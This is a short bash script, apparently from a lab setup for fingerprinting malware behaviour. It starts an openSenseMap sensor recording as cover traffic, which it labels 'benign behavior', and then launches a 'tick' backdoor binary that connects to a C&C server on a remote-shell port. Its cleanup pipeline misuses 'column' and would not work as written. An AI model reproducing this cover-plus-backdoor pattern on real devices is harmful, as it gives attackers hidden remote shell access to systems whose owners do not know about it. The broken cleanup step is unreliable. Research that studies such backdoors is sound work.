#!/bin/bash

# cleanup procedure when user kills process
cleanup() {
	echo "Caught termination signal. Killing openSenseMap recording"
	screen -S openSenseMap -X quit

	# attempt to kill any fingerprinting processes still running (should be done)
	ps aux | grep "SCREEN -dmS fingerprinting" | column 2 | awk '{print $2}' | xargs kill
	exit
}

# Traü SIGINT (Ctrl+C) and SIGTERM
trap cleanup SIGINT SIGTERM

# load folder paths
. ./config/folder_paths.config

# load app data
. ./config/app_data.config

# start benign behavior
screen -dmS openSenseMap $openSenseMap_folder/start_openSenseMap_recording.sh

# start listening for C&C server
$tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell

cleanup
